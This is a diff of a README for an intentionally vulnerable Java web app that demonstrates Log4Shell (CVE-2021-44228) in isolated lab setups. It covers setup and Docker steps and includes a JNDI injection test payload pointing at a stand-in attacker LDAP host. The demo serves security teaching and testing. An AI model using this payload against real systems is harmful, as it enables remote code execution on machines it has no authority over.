@@ -1,28 +1,66 @@
-# Log4Shell Vulnerable Web Form Demo
+# CVE-2021-44228 Log4Shell WebApp Demo
 
-This is a minimal Java web application that demonstrates the CVE-2021-44228 (Log4Shell) vulnerability using a web form and Log4j 2.14.1.  
-It is meant for **educational and testing purposes only** in isolated environments.
+This is a minimal Java web application vulnerable to **Log4Shell (CVE-2021-44228)**, built with:
 
-# Warning
-**Do not run this on public networks or production systems. This app is vulnerable to remote code execution (RCE).**
+- Java + Jetty (embedded)
+- Log4j 2.14.1 (vulnerable)
+- Simple HTML form
+- Docker or manual Java support
+
+**Intended strictly for educational and controlled testing purposes.** Never expose this to the internet.
+
+---
 
 ## Quick Start
 
-### Requirements
+### Prerequisites:
+- Debian/Ubuntu-based system
+- Internet access
 
-- Git installed
-- Docker installed
-- Docker-cli installed
+### Run the setup script:
+```bash
+chmod +x setup.sh
+./setup.sh
+```
 
-### Run in 3 steps
+Open your browser and visit:
+👉 [http://localhost:8080](http://localhost:8080)
+
+---
+
+## Docker Alternative
+
+If you prefer Docker:
 
 ```bash
-# 1. Clone the repository
-git clone https://github.com/SanderSchepers1993/CyberSec25.git
-cd CyberSec25
-
-# 2. Build the Docker image
 docker build -t log4shell-webform .
-
-# 3. Run the container
 docker run -p 8080:8080 log4shell-webform
+```
+
+---
+
+## Test Payload (work in progress)
+
+Submit the following payload to the form:
+```text
+${jndi:ldap://attacker.com/a}
+```
+This will be **logged by Log4j**, potentially triggering the Log4Shell exploit **if you have a rogue LDAP server running**.
+
+---
+
+## Project Structure
+```
+CyberSec25/
+├── Main.java
+├── log4j2.xml
+├── Dockerfile
+├── setup.sh
+├── README.md
+└── libs/ (downloaded automatically)
+```
+
+---
+
+## Disclaimer
+This project is intentionally vulnerable. Use responsibly in **isolated test environments** only. The author takes no responsibility for misuse.
